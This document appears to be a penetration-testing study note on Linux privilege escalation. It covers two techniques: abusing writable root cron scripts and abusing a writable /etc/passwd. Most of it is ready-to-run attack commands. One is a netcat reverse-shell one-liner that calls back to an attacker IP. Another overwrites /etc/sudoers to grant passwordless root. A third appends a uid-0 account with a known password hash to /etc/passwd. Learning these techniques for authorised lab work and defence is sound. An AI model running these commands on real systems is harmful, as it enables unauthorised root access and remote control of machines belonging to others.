---
tags: openssl
---
## Abusing Cron Jobs

Prerequisite:
- locate an executable file that not only allows us write access, but also runs at an elevated privilege level

Check running cron jobs:
`grep "CRON" /var/log/syslog`

Target cron jobs which run as root

Can infer its running period by its timestamp

Use `cat` to inspect its contents and `ls -lah` to inspect its permissions (see if it allows write access to us)

### Reverse shell

Edit target script to add a reverse shell one-liner. When the cron job starts again, we will receive the reverse shell as root
`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> [script_path]`

Finally, set up a listener and wait for the cron job to run

### Give current user sudo rights

Alternatively, 
`echo 'kali ALL=(root) NOPASSWD: ALL' > /etc/sudoers`
to add your current user as a sudoer (where `kali` is your current username)

## Abusing Password Authentication

Prerequisite: **/etc/passwd** is writeable by us

- Unless a centralized credential system such as Active Directory or LDAP is used, Linux passwords are generally stored in **/etc/shadow**, which is not readable by normal users
- For backwards compatibility, if a password hash is present in the second column of an **/etc/passwd** user record, it is considered valid for authentication and it takes precedence over the respective entry in **/etc/shadow**

Goal: write a password hash into **/etc/passwd** to set an arbitrary password for any account

Add another superuser (root2) and the corresponding password hash to **/etc/passwd**:
1. Generate password hash:
   `openssl passwd w00t`
2. Write the new entry to **/etc/passwd**:
   `echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd`
3. Escalate privileges with the password!
   `su root2`